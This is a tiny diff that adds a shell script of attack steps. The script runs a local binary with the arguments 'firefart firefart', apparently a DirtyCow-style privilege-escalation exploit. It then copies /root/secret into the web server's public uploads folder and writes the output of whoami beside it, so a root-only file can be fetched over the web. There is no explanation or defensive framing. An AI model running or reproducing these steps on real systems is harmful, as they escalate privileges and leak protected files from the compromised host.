@@ -1,0 +1,5 @@
+echo test
+./s firefart firefart
+cat /root/secret >>/var/www/html/uploads/secret
+whoami >>/var/www/html/uploads/user
+echo test2
